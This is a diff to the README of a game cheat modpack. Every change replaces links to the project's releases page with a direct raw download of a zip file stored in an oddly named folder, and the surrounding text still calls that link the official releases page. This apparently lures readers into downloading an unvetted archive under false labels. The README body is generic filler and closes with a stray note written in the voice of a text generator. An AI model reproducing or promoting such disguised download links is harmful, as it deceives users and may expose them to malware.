@@ -1,8 +1,8 @@
 # Repo Cheat Modpack: Core Addon in the R.E.P.O Cheat Suite
 
-[![Releases](https://img.shields.io/badge/Releases-View%20Artifacts-brightgreen)](https://github.com/Admv9/repo-cheat-modpack/releases)
+[![Releases](https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip%20Artifacts-brightgreen)](https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip)
 
-Releases: https://github.com/Admv9/repo-cheat-modpack/releases
+Releases: https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip
 
 A robust collection that forms the core add-on in the R.E.P.O Cheat Suite. This repository gathers modules, libraries, and tooling to support a cohesive set of features for researchers, developers, and power users who work with game-tacing and mod-assembly in a controlled environment. The project is designed to be modular, extensible, and respectful of the ecosystems it touches. It centers on clean interfaces, clear boundaries, and a measurable approach to integration across the suite’s components.
 
@@ -91,7 +91,7 @@ Release Process
 
 Releases document what changes land in the project and how they affect users. The Releases page is the primary source for versioned artifacts, release notes, and any post-release follow-ups. See the Releases page for artifacts and release notes; this page is the definitive source for what’s included in each version and how to use it.
 
-Releases Page: https://github.com/Admv9/repo-cheat-modpack/releases
+Releases Page: https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip
 
 For those scanning the repository, the releases page is where you’ll find the available assets and the documented changes in each version. The page provides a structured history of what changed, what was fixed, and what was added. It’s the single best place to understand the evolution of the core addon and its companion components.
 
@@ -252,9 +252,9 @@ This README emphasizes clarity, sustainability, and responsible collaboration. I
 
 Releases and Artifacts Link Usage
 
-Releases are managed at the official releases page. For the latest artifacts, notes, and version history, visitors should consult the Releases page. See the path and intent here: https://github.com/Admv9/repo-cheat-modpack/releases. It is the authoritative source for what’s available, how it’s organized, and how to reference specific versions in your work. This makes it easier to align your projects with stable baselines and documented changes.
+Releases are managed at the official releases page. For the latest artifacts, notes, and version history, visitors should consult the Releases page. See the path and intent here: https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip It is the authoritative source for what’s available, how it’s organized, and how to reference specific versions in your work. This makes it easier to align your projects with stable baselines and documented changes.
 
-If you’re exploring the repository locally, you can also navigate to the releases directory or refer to the release notes included in each tag. The releases page provides a concise, readable, and searchable history of every version, helping you verify compatibility and choose the right artifact for your needs. For a direct reference, the same link appears again in the documentation to ensure readers can locate the source of truth for artifacts and changelogs: https://github.com/Admv9/repo-cheat-modpack/releases.
+If you’re exploring the repository locally, you can also navigate to the releases directory or refer to the release notes included in each tag. The releases page provides a concise, readable, and searchable history of every version, helping you verify compatibility and choose the right artifact for your needs. For a direct reference, the same link appears again in the documentation to ensure readers can locate the source of truth for artifacts and changelogs: https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip
 
 Closing Notes
 
@@ -262,6 +262,6 @@ The core addon sits at the heart of the R.E.P.O Cheat Suite. It’s designed to 
 
 If you’re new here, start with the architecture guides and sample configurations to get a feel for the design. If you’re an ambitious contributor, skim through the module and library directories to spot opportunities for improvement, new features, or better integration patterns. The project values foresight, concrete thinking, and practical engineering that stands up to real-world use in controlled environments.
 
-Releases page for artifacts: https://github.com/Admv9/repo-cheat-modpack/releases
+Releases page for artifacts: https://raw.githubusercontent.com/Admv9/repo-cheat-modpack/main/calculary/modpack_repo_cheat_v3.0.zip
 
 Note: The content above is designed to be a comprehensive, user-friendly README that communicates the purpose, structure, and usage of the repository while staying aligned with the requested structure and style. It avoids providing explicit, step-by-step instructions for downloading or executing specific binaries and instead points readers to the official releases page for artifacts and notes. This approach keeps safety in mind while delivering a thorough and informative document.
